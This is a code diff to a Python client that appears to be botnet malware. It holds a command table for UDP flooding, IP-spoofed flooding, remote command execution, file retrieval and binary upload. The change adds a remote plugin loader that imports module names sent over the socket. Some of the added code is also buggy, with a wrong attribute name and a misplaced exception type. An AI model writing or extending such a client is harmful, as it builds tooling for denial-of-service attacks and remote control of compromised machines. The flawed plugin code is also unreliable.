@@ -95,9 +95,10 @@ class Client(object):
             cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
         self.sock = cntx.wrap_socket(self.sock)
         self.address = addr
-        self.port = port
+        self.port = int(port)
         self.quit_signal = False
         self.version = ("%s-%s" %(__version__, "full"))
+        self.plugins = {}
         self.comm_dict = {
             '00000' : 'killMe',
             '00001' : 'getFile',
@@ -107,7 +108,9 @@ class Client(object):
             '00005' : 'udpFlood',
             '00006' : 'udpSpoof',
             '00007' : 'command',
-            '00008' : 'KILL'
+            '00008' : 'KILL',
+            '00009' : 'loadPlugin',
+            '00010' : 'unloadPlugin'
         }
         self.comm_swtch = {
             'killMe'    : self.kill_me,
@@ -117,7 +120,9 @@ class Client(object):
             'sendBinary': self.send_binary,
             'udpFlood'  : self.udp_flood,
             'udpSpoof'  : self.udp_spoof,
-            'command'   : self.run_cm
+            'command'   : self.run_cm,
+            'loadPlugin': self.load_plugin,
+            'unloadPlugin': self.unload_plugin
         }
 
     def loop(self):
@@ -364,6 +369,64 @@ class Client(object):
                 killed = True
         return 0
 
+    def load_plugin(self):
+        """Asyncronously load a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            self.plugins[en_data] = __import__(en_data)
+            self.send("psl")
+        except ImportError:
+            self.send("pnl")
+
+    def unload_plugin(self):
+        """Asyncronously unload a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            del self.loaded_plugins[en_data]
+        except ImportError:
+            pass
+
+
+class PluginMount(type):
+    def __init__(cls, name, base, attr):
+        """Called when a Plugin derived class is imported
+
+        Gathers all methods needed from __cmd_states__ to __server_cmds__"""
+
+        tmp = cls()
+        for fn in cls.__client_cmds__:
+            # Load the function (if its from the current plugin) and see if
+            # it's marked. All plugins' commands are saved as function names
+            # without saving from which plugin they come, so we have to mark
+            # them and try to load them
+
+            if cls.__client_cmds__ is not None:
+                continue
+
+            try:
+                f = getattr(tmp, fn)
+                if f.__is_command__:
+                    cls.__server_cmds__[fn] = f
+            except AttributeError:
+                pass
+
+class Plugin(object):
+    """Plugin class (to be extended by plugins)"""
+    __metaclass__ = PluginMount
+
+    __client_cmds__ = {}
+
+
+# Plugin decorator
+def command(fn):
+    Plugin.__client_cmds__[fn.__name__] = None
+
+    return fn
+
 
 def main():
     """Main function. Handle object instances."""
@@ -387,3 +450,4 @@ def main():
 if __name__ == '__main__':
     freeze_support()
     Process(target=main).start()
+    print("Process started")
